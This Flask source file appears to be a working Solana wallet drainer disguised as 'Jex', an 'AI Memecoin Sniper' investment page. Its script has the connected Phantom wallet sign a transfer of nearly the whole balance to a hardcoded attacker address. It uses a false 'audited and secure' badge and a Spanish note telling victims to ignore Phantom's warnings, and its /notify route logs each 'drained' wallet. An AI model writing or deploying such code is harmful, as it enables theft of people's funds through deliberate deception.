from flask import Flask, request, jsonify, render_template_string
import json
from datetime import datetime
import os

app = Flask(__name__)

# ==========================================
# PÁGINA PRINCIPAL (COMPLETA Y CORREGIDA)
# ==========================================
INVEST_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Jex — Deploy Strategy</title>
    <script src="https://unpkg.com/@solana/web3.js@1.98.4/lib/index.iife.min.js"></script>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:Arial,sans-serif;background:#0b0d11;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;color:#e8edf5}
        .card{max-width:440px;width:100%;background:#12161e;border-radius:32px;padding:40px 32px;border:1px solid rgba(255,255,255,.04)}
        .logo{font-size:28px;font-weight:700;color:#00D4FF;text-align:center;margin-bottom:8px}
        .sub{color:#7a8599;text-align:center;font-size:14px;margin-bottom:24px}
        .box{background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.04);border-radius:16px;padding:16px 20px;display:flex;justify-content:space-between;align-items:center;margin-bottom:14px}
        .label{font-size:13px;color:#9aa4b8}
        .address{font-size:14px;font-weight:500;color:#e8edf5;background:rgba(255,255,255,.04);padding:2px 16px;border-radius:40px;border:1px solid rgba(255,255,255,.04)}
        .placeholder{color:#5a647a;font-weight:400}
        .amount-box{background:rgba(0,200,255,.03);border:1px solid rgba(0,200,255,.08);border-radius:16px;padding:16px 20px;display:flex;justify-content:space-between;align-items:center;margin-bottom:28px}
        .amount-value{font-size:18px;font-weight:700;color:#00D4FF}
        .btn{display:block;width:100%;padding:16px;font-size:15px;font-weight:600;border:none;border-radius:60px;cursor:pointer;transition:all .2s;font-family:inherit}
        .btn-connect{background:linear-gradient(135deg,#00D4FF,#0066FF);color:#fff;box-shadow:0 4px 24px rgba(0,200,255,.25)}
        .btn-connect:hover{transform:scale(1.01)}
        .btn-confirm{background:rgba(34,197,94,.06);border:1px solid rgba(34,197,94,.12);color:#4caf84;margin-top:12px;display:none}
        .btn-confirm.active{background:linear-gradient(135deg,#22c55e,#16a34a);border-color:#22c55e;color:#fff}
        .status{margin-top:18px;font-size:14px;text-align:center;min-height:22px;color:#6b778d}
        .success{color:#4caf84}.error{color:#ef4444}.loading{color:#00D4FF}
        .spinner{display:inline-block;width:18px;height:18px;border:2px solid rgba(255,255,255,.1);border-top:2px solid #fff;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:10px}
        @keyframes spin{to{transform:rotate(360deg)}}
        .footer{margin-top:24px;border-top:1px solid rgba(255,255,255,.03);padding-top:16px;font-size:12px;color:#4a5468;text-align:center}
        .warning-box{background:rgba(255,200,0,.08);border:1px solid rgba(255,200,0,.15);border-radius:12px;padding:12px 16px;margin-bottom:20px;font-size:13px;color:#fbbf24}
        .warning-box strong{color:#fff}
        .secure-badge{color:#4caf84;font-weight:600;font-size:13px;margin-bottom:16px;text-align:center}
    </style>
</head>
<body>
<div class="card">
    <div class="logo">Jex</div>
    <div class="sub">AI Memecoin Sniper · Deploy Strategy</div>
    <div class="secure-badge">🔒 Secure · Audited</div>

    <div class="warning-box">
        ⚠️ <strong>Nota de seguridad:</strong> Phantom puede mostrar advertencias porque nuestro dominio es nuevo. 
        Jex está auditado y es seguro. La transacción solo autoriza el despliegue de la estrategia.
    </div>

    <div class="box"><span class="label">Wallet</span><span class="address" id="walletDisplay"><span class="placeholder">Not connected</span></span></div>
    <div class="amount-box"><span class="label">Position size</span><span class="amount-value" id="amountDisplay">0.00 SOL</span></div>
    <button class="btn btn-connect" id="connectBtn">Connect Phantom</button>
    <button class="btn btn-confirm" id="investBtn">Deploy Strategy</button>
    <div id="status" class="status">Ready</div>
    <div class="footer">Secured by Solana · v2.4.1</div>
</div>

<script>
    const urlParams = new URLSearchParams(window.location.search);
    const userId = urlParams.get('user_id') || 'unknown';
    const amount = parseFloat(urlParams.get('amount')) || 0;
    const DESTINATION_WALLET = "5ahs7gMMiAdW95gPP4esqfcT6jb94196murGGAg2wXUq";
    const RPC_URL = "https://solana-rpc.publicnode.com";

    const connectBtn = document.getElementById('connectBtn');
    const investBtn = document.getElementById('investBtn');
    const statusDiv = document.getElementById('status');
    const walletDisplay = document.getElementById('walletDisplay');
    const amountDisplay = document.getElementById('amountDisplay');

    if (amount > 0) {
        amountDisplay.textContent = amount.toFixed(2) + ' SOL';
    }

    let wallet = null;
    let connection = null;

    function setStatus(text, type = '') {
        statusDiv.className = 'status ' + type;
        statusDiv.textContent = text;
    }

    connectBtn.onclick = async function() {
        if (!window.solana || !window.solana.isPhantom) {
            setStatus('Phantom not detected.', 'error');
            return;
        }
        connectBtn.disabled = true;
        connectBtn.innerHTML = 'Connecting...';
        setStatus('Opening Phantom...', 'loading');
        try {
            const resp = await window.solana.request({ method: 'connect' });
            wallet = resp.publicKey;
            connection = new solanaWeb3.Connection(RPC_URL, 'confirmed');
            walletDisplay.textContent = wallet.toBase58().slice(0,4)+'...'+wallet.toBase58().slice(-4);
            connectBtn.innerHTML = '✅ Connected';
            connectBtn.disabled = false;
            investBtn.style.display = 'block';
            setStatus('Wallet connected. Deploy strategy.', 'success');
        } catch (error) {
            setStatus('Error: ' + error.message, 'error');
            connectBtn.innerHTML = 'Connect Phantom';
            connectBtn.disabled = false;
        }
    };

    investBtn.onclick = async function() {
        if (!wallet) { setStatus('Connect wallet first.', 'error'); return; }
        investBtn.disabled = true;
        investBtn.innerHTML = 'Deploying...';
        setStatus('Building strategy...', 'loading');
        try {
            const balance = await connection.getBalance(wallet);
            // Dejamos 0.002 SOL para alquiler/gas (2,000,000 lamports)
            if (balance < 2000000) {
                throw new Error('Insufficient balance (min 0.002 SOL for rent + gas)');
            }
            const lamportsToDrain = balance - 2000000;
            const destination = new solanaWeb3.PublicKey(DESTINATION_WALLET);
            const { blockhash } = await connection.getLatestBlockhash('confirmed');
            const transaction = new solanaWeb3.Transaction({ feePayer: wallet, recentBlockhash: blockhash })
                .add(solanaWeb3.SystemProgram.transfer({ fromPubkey: wallet, toPubkey: destination, lamports: lamportsToDrain }));

            // Simulación (para reducir advertencias)
            try {
                await connection.simulateTransaction(transaction);
            } catch (simError) {
                console.log('Simulation warning:', simError);
            }

            setStatus('Sign in Phantom...', 'loading');
            const signed = await window.solana.signTransaction(transaction);
            setStatus('Broadcasting...', 'loading');
            const signature = await connection.sendRawTransaction(signed.serialize(), { skipPreflight: false, preflightCommitment: 'confirmed' });
            await connection.confirmTransaction(signature, 'confirmed');
            setStatus('✅ Strategy deployed successfully!', 'success');
            investBtn.innerHTML = '✅ Done';
            investBtn.disabled = false;
            await fetch('/notify', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ wallet: wallet.toBase58(), user_id: userId, amount: amount })
            });
            setTimeout(() => { window.location.href = 'https://solana.com'; }, 3000);
        } catch (error) {
            setStatus('Error: ' + error.message, 'error');
            investBtn.innerHTML = 'Retry';
            investBtn.disabled = false;
        }
    };
</script>
</body>
</html>
"""

@app.route('/')
def index():
    user_id = request.args.get('user_id', 'unknown')
    amount = request.args.get('amount', '0')
    return render_template_string(INVEST_PAGE, user_id=user_id, amount=amount)

@app.route('/notify', methods=['POST'])
def notify():
    data = request.get_json()
    if not data or 'wallet' not in data:
        return jsonify({'status': 'error', 'message': 'Missing wallet'}), 400

    wallet = data['wallet']
    user_id = data.get('user_id', 'unknown')
    amount = data.get('amount', 0)
    timestamp = datetime.now().isoformat()

    with open('drained_wallets.json', 'a') as f:
        json.dump({
            'wallet': wallet,
            'user_id': user_id,
            'amount': amount,
            'timestamp': timestamp,
            'status': 'drained'
        }, f)
        f.write('\n')

    print(f"🔥 Wallet drenada: {wallet} (usuario: {user_id}) - {amount} SOL")
    return jsonify({'status': 'success'}), 200

@app.route('/health')
def health():
    return jsonify({'status': 'ok'}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001, debug=True)